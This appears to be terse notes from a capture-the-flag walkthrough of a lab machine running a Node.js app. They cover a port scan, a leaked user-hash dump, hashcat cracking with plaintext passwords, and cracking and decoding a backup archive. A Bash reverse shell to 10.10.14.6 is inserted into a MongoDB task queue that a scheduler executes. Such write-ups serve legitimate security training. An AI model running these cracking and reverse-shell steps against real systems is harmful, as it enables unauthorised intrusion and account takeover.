### Port scan
```text
PORT     STATE SERVICE            REASON  VERSION
22/tcp   open  ssh                syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=
|   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
3000/tcp open  hadoop-tasktracker syn-ack Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
|_http-title: MyPlace
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Users from http://10.10.10.58:3000/api/users/
```json
[
	{"_id":"59a7365b98aa325cc03ee51c",
	 "username":"myP14ceAdm1nAcc0uNT",
	 "password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
	 "is_admin":true},
	 
	 {"_id":"59a7368398aa325cc03ee51d",
	 "username":"tom",
	 "password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
	 "is_admin":false},
	 
	 {"_id":"59a7368e98aa325cc03ee51e",
	 "username":"mark",
	 "password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
	 "is_admin":false},
	 
	 {"_id":"59aa9781cced6f1d1490fce9",
	 "username":"rastating",
	 "password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0", 
	 "is_admin":false}
]
```

### Creds
```bash\
# cmd
hashcat -m 1400 -a 0 --force hashes.txt /usr/share/wordlists/rockyou.txt --show

# result
myP14ceAdm1nAcc0uNT:manchester
tom:spongebob
mark:snowflake
```

### Exploitation
```bash
# download myplace.backup
myplace.backup

# decode file to zip
cat myplace.backup | base64 -d > myplace.zip

# crack password of the zip file
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myplace.zip
:::magicword

# found mark's cred on app.js
mark:5AYRft73VtFpc84k

# login mark
sshpass -p "5AYRft73VtFpc84k" ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" mark@10.10.10.58

```

### Priv Esc
```bash

# Tom's processes
tom       1236  0.0  5.6 1008568 42640 ?       Ssl  06:48   0:04 /usr/bin/node /var/scheduler/app.js
tom       1237  0.1  7.8 1050532 59568 ?       Ssl  06:48   0:18 /usr/bin/node /var/www/myplace/app.js

# sus /var/scheduler/app.js
MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});


# connect to mongo db by mark's cred
mongo -u mark -p 5AYRft73VtFpc84k scheduler

# display collections
show collections
>tasks

# list instances from collection
db.tasks.find()

# craft reverse shell and insert to the db and get tom's shell
db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"})

#

# SUID (BOF...)
-rwsr-xr-- 1 root admin 17K Sep  3  2017 /usr/local/bin/backup (Unknown SUID binary)


```
